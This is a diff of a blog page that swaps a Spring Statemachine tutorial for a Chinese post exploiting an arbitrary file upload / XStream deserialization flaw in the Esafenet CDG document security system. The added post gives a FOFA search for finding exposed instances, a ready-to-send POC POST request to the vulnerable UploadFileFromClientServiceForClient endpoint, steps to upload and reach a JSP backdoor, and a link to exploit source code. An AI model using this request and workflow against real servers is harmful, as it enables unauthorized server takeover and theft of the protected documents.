@@ -16,21 +16,21 @@
   <meta name="author" content="candy">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Spring Statemachine 是一个用于处理复杂状态机的框架，能够帮助你管理和控制状态转换。以下是如何在 Spring Boot 项目中使用 Spring Statemachine 的基本步骤： 1. 添加依赖首先，在你的 pom.xml 文件中添加 Spring Statemachine 依赖： 12345&lt;dependency&gt;    &lt;groupId&gt;org">
+    <meta name="description" content="一、产品简介亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结">
 <meta property="og:type" content="article">
-<meta property="og:title" content="spring_state_machine">
-<meta property="og:url" content="https://candyadmin.github.io/2024/09/19/spring-state-machine/index.html">
+<meta property="og:title" content="亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用">
+<meta property="og:url" content="https://candyadmin.github.io/2024/09/29/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FXStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/index.html">
 <meta property="og:site_name" content="点到为止">
-<meta property="og:description" content="Spring Statemachine 是一个用于处理复杂状态机的框架，能够帮助你管理和控制状态转换。以下是如何在 Spring Boot 项目中使用 Spring Statemachine 的基本步骤： 1. 添加依赖首先，在你的 pom.xml 文件中添加 Spring Statemachine 依赖： 12345&lt;dependency&gt;    &lt;groupId&gt;org">
+<meta property="og:description" content="一、产品简介亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-09-19T08:35:59.000Z">
-<meta property="article:modified_time" content="2024-09-19T08:36:10.705Z">
+<meta property="article:published_time" content="2024-09-29T09:50:52.000Z">
+<meta property="article:modified_time" content="2024-09-29T09:58:27.065Z">
 <meta property="article:author" content="candy">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>spring_state_machine - 点到为止</title>
+  <title>亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用 - 点到为止</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -196,7 +196,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="spring_state_machine"></span>
+            <span id="subtitle" data-typed-text="亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用"></span>
           
         </div>
 
@@ -207,8 +207,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-09-19 16:35" pubdate>
-          2024年9月19日 下午
+        <time datetime="2024-09-29 17:50" pubdate>
+          2024年9月29日 下午
         </time>
       </span>
     
@@ -219,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          541 字
+          450 字
         
       </span>
     
@@ -230,7 +230,7 @@
         
         
         
-          5 分钟
+          4 分钟
         
       </span>
     
@@ -267,27 +267,15 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">spring_state_machine</h1>
+            <h1 id="seo-header">亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用</h1>
             
             
               <div class="markdown-body">
                 
-                <p>Spring Statemachine 是一个用于处理复杂状态机的框架，能够帮助你管理和控制状态转换。以下是如何在 Spring Boot 项目中使用 Spring Statemachine 的基本步骤：</p>
-<h3 id="1-添加依赖"><a href="#1-添加依赖" class="headerlink" title="1. 添加依赖"></a>1. <strong>添加依赖</strong></h3><p>首先，在你的 <code>pom.xml</code> 文件中添加 Spring Statemachine 依赖：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.statemachine<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-statemachine-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <span class="hljs-comment">&lt;!-- 或者使用最新版本 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="2-定义状态和事件"><a href="#2-定义状态和事件" class="headerlink" title="2. 定义状态和事件"></a>2. <strong>定义状态和事件</strong></h3><p>在 Spring Statemachine 中，你需要定义状态和事件。这些通常是枚举类型。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">States</span> &#123;<br>    START,<br>    PROCESSING,<br>    FINISHED,<br>    ERROR<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Events</span> &#123;<br>    BEGIN,<br>    COMPLETE,<br>    FAIL<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<h3 id="3-配置状态机"><a href="#3-配置状态机" class="headerlink" title="3. 配置状态机"></a>3. <strong>配置状态机</strong></h3><p>接下来，你需要配置状态机的状态和事件。你可以创建一个配置类来完成这一工作。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.statemachine.config.EnableStateMachine;<br><span class="hljs-keyword">import</span> org.springframework.statemachine.config.builders.StateMachineBuilder;<br><span class="hljs-keyword">import</span> org.springframework.statemachine.config.builders.StateMachineConfigurerAdapter;<br><span class="hljs-keyword">import</span> org.springframework.statemachine.config.builders.StateMachineStateConfigurer;<br><span class="hljs-keyword">import</span> org.springframework.statemachine.config.builders.StateMachineTransitionConfigurer;<br><span class="hljs-keyword">import</span> org.springframework.statemachine.config.builders.StateMachineStateConfigurer;<br><span class="hljs-keyword">import</span> org.springframework.statemachine.config.builders.StateMachineTransitionConfigurer;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@EnableStateMachine</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StateMachineConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">StateMachineConfigurerAdapter</span>&lt;States, Events&gt; &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(StateMachineStateConfigurer&lt;States, Events&gt; states)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        states<br>            .withStates()<br>                .initial(States.START)<br>                .state(States.PROCESSING)<br>                .state(States.FINISHED)<br>                .state(States.ERROR);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(StateMachineTransitionConfigurer&lt;States, Events&gt; transitions)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        transitions<br>            .withExternal()<br>                .source(States.START).target(States.PROCESSING).event(Events.BEGIN)<br>            .and()<br>            .withExternal()<br>                .source(States.PROCESSING).target(States.FINISHED).event(Events.COMPLETE)<br>            .and()<br>            .withExternal()<br>                .source(States.PROCESSING).target(States.ERROR).event(Events.FAIL);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<h3 id="4-使用状态机"><a href="#4-使用状态机" class="headerlink" title="4. 使用状态机"></a>4. <strong>使用状态机</strong></h3><p>你可以在 Spring 组件中注入状态机并使用它来处理状态转换。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.statemachine.StateMachine;<br><span class="hljs-keyword">import</span> org.springframework.statemachine.config.StateMachineFactory;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<br><br><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StateMachineService</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> StateMachine&lt;States, Events&gt; stateMachine;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startProcess</span><span class="hljs-params">()</span> &#123;<br>        stateMachine.sendEvent(Events.BEGIN);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">completeProcess</span><span class="hljs-params">()</span> &#123;<br>        stateMachine.sendEvent(Events.COMPLETE);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">failProcess</span><span class="hljs-params">()</span> &#123;<br>        stateMachine.sendEvent(Events.FAIL);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<h3 id="5-运行和测试"><a href="#5-运行和测试" class="headerlink" title="5. 运行和测试"></a>5. <strong>运行和测试</strong></h3><p>确保你已经启动了 Spring Boot 应用程序，并且在你的服务中调用状态机的方法来触发事件和状态转换。</p>
-<h3 id="6-进一步定制"><a href="#6-进一步定制" class="headerlink" title="6. 进一步定制"></a>6. <strong>进一步定制</strong></h3><p>Spring Statemachine 提供了很多高级功能，比如状态持久化、事件监听器、状态机持久化等。如果你有更多复杂的需求，可以参考 <a target="_blank" rel="noopener" href="https://docs.spring.io/spring-statemachine/docs/current/reference/html/">Spring Statemachine 官方文档</a> 以获取详细的配置信息和示例。</p>
-<p>这些是基本的使用步骤，你可以根据实际需要进行更复杂的配置和定制。</p>
+                <p>一、产品简介<br>亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。<br>二、漏洞描述<br>亿赛通电子文档安全管理系统UploadFileFromClientServiceForClient接口处存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。<br>三、影响范围<br>未知<br>四、复现环境<br>FOFA：app&#x3D;“亿赛通-电子文档安全管理系统”<br>五、漏洞复现<br>1.访问存在漏洞网站，抓包<br>2.POC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs angular2html">POST /CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM HTTP/1.1<br>Host: IP：port<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Sec-Fetch-Dest: document<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-Site: none<br>Sec-Fetch-User: ?1<br>Upgrade-Insecure-Requests: 1<br><br><br>上传的文件内容<br></code></pre></td></tr></table></figure>
+<p>3.测试，上传成功<br>4.访问ip:port&#x2F;tttT.jsp</p>
+<p>利用源码：<a target="_blank" rel="noopener" href="https://github.com/candyadmin/CDGXStreamDeserRCE">https://github.com/candyadmin/CDGXStreamDeserRCE</a><br>教程：<br><a target="_blank" rel="noopener" href="https://www.yuque.com/u34516370/hi2ux9/nibcqge2832vptra">https://www.yuque.com/u34516370/hi2ux9/nibcqge2832vptra</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/uuzeray/article/details/136690493">https://blog.csdn.net/uuzeray/article/details/136690493</a></p>
 
                 
               </div>
@@ -305,8 +293,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>spring_state_machine</div>
-      <div>https://candyadmin.github.io/2024/09/19/spring-state-machine/</div>
+      <div>亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用</div>
+      <div>https://candyadmin.github.io/2024/09/29/亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用/</div>
     </div>
     <div class="license-meta">
       
@@ -318,7 +306,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年9月19日</div>
+          <div>2024年9月29日</div>
         </div>
       
       
@@ -350,18 +338,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/09/29/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FXStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/" title="亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">亿赛通电子文档安全管理系统XStream反序列化漏洞任意文件上传利用</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/09/11/Application-toolkit-trace-cross-thread/" title="Application-toolkit-trace-cross-thread">
-                        <span class="hidden-mobile">Application-toolkit-trace-cross-thread</span>
+                      <a href="/2024/09/19/spring-state-machine/" title="spring_state_machine">
+                        <span class="hidden-mobile">spring_state_machine</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
